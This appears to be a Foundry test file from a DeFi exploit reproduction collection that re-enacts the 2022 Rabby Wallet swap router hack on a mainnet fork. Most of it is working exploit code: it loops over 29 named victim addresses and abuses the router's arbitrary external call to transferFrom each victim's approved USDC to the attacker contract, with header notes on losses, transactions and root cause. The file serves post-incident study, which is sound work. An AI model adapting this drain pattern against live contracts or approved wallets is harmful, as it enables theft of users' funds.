// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~200,000 US$
// Attacker : 0xb687550842a24d7fbc6aad238fd7e0687ed59d55
// Attack Contract : 0x9682f31b3f572988f93c2b8382586ca26a866475
// Vulnerable Contract : 0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1 and these: https://twitter.com/Rabby_io/status/1579833969566449666
// Attack Txs :
//      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26
//      0xa02c180149ce03d1b6e3d412585000b968b7db59a277717ec51d0899c1a3c017
//      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26
//      0xf1c1066c259672396b8f242311a9f1c83bfa52c27529d713d80a3da93047c37f
//      0x53835af1b7df33435188d2380328b81c0e8a22b01353c76e3dac352275895b45
//      0x322592750691798488006a26aa042b55ab9d7637f9b0adc42089a4c480e51870
//      0xce0935010baf445e300d4d600caac7fc1fecb5ccb092cdbef57904aa7e5408b2
//      0x366df0c20e00666749b16ae00475b3c41834dc659ebb29e059aa9bffa892c038
//      0x9fac5412eb42aab07dcb2c5fbb03669aaa98d9c57849d44d8291d3156d9f4871
//      0xff1f352912666796d5cd51b5dfa3e6319544aeb5938e1e9f310fd5fcb02be6da
//      0x84156ea5360b679dfa7cdda80c16aafbfdf1ba20b84bcf76f79666f0c405b86f
//      0xc10ec615e2d18c8a7dad2bb2418c422472565d9622ed851298fc848c3a451387
//      0x7cefbfd14497b1c577423d94ea521615991eee2590fab980230d9dd1d80ccf1c
//      0x8bcac5e570aa695b5e0ce7dd58766eaa5830f44bbef5008aef63c6efb036e717
//      0xb3af75f703ddc5d15ff872585b7d970c5204b90399a5859ec39e736a2ffbf375
//      0x708ffcf4a76bd159056afb17ce6c5f5adcb5899e465bbf038aae79c3cef666ae
//      0xca53e107a9a21d8f431614570a98c4718cca7172415e3fbed8842d426ac3ab54
//      0x5bbab18059f8c3fec56a0ddcd15feddf7cda8b8007b254436956db1d9ffe72ec
//      0x6899b8caee16dbd75359cabcd24e32b2362c474cdf39ea810cf4386018761beb
//      0x07887fffc4488354d813fdcca5da0586dd6f9a3da36d503af768302eacbeec41
// Reproduce Tx: Steal USDC - 0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26

// @Analysis
// Twitter Supremacy : https://twitter.com/Supremacy_CA/status/1579813933669486592
// Twitter SlowMist : https://twitter.com/SlowMist_Team/status/1579839744128978945
// Twitter Beosin Alert : https://twitter.com/BeosinAlert/status/1579856733178331139

// Root cause : Classic arbitrary external call vulnerability
// Multiple tokens has been stolen, and 114 ETH deposited to Tornado Cash

contract ContractTest is Test {
    IRabbySwap constant RABBYSWAP_ROUTER = IRabbySwap(0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1);
    IUSDT constant USDT_TOKEN = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_724_451);
        vm.label(address(RABBYSWAP_ROUTER), "RABBYSWAP_ROUTER");
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(USDC_TOKEN), "USDC_TOKEN");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
        );

        // Somehow attacker got these EOA addresses that approved the Rabby Wallet Swap Router contract.
        // ...Maybe the attacker grepped the history Txs and found those victims that interacted with the Swap Router contract.
        address[29] memory victims = [
            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,
            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,
            0xDAcCce559a0571083556f39d05b177579613D83b,
            0x720610ed4925676D971B0ae5b3080bd233E19038,
            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,
            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8,
            0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B,
            0x9A93C5f7680724F6b7097085B0052A56D80615Bd,
            0x491968b05D95979BA3a52D73D8a39EA96693f011,
            0xc64284527B04A48c6673dF62f5B48188Ccfdf658,
            0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644,
            0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2,
            0x48aa9d67cb713804C005516BCa7769c159d7897C,
            0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3,
            0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f,
            0x73B37009778048f6dB88fD602582473e74e5019a,
            0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb,
            0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf,
            0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7,
            0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85,
            0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b,
            0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4,
            0xd38023D7Ee559672fA00eA5156734710bcc0e781,
            0x059c1592696D430E7bA8cccC984BA9639b8CF90B,
            0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325,
            0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110,
            0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc,
            0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6,
            0x1Fc550e98aD3021e32C47A84019F77a0792c60B7
        ];

        for (uint256 i; i < victims.length; ++i) {
            // Step 1: Check the victim's USDC balance and allowance to RABBYSWAP_ROUTER
            uint256 vic_balance = USDC_TOKEN.balanceOf(victims[i]);
            uint256 vic_allowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));

            // Step 2: If allowance >= balance: exploit!
            if (vic_allowance >= vic_balance) {
                // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.
                bytes memory usdc_callbackData = abi.encodeWithSignature(
                    "transferFrom(address,address,uint256)", victims[i], address(this), vic_balance
                );
                RABBYSWAP_ROUTER.swap(
                    address(USDT_TOKEN),
                    0,
                    address(this),
                    4660,
                    address(USDC_TOKEN),
                    address(USDC_TOKEN),
                    usdc_callbackData,
                    block.timestamp
                );
            }
        }

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
        );
    }

    function balanceOf(address) external pure returns (uint256) {
        return 100e18;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    receive() external payable {}
}

/* -------------------- RabbySwap Interface -------------------- */
interface IRabbySwap {
    function swap(
        address srcToken,
        uint256 amount,
        address dstToken,
        uint256 minReturn,
        address dexRouter,
        address dexSpender,
        bytes memory data,
        uint256 deadline
    ) external;
}
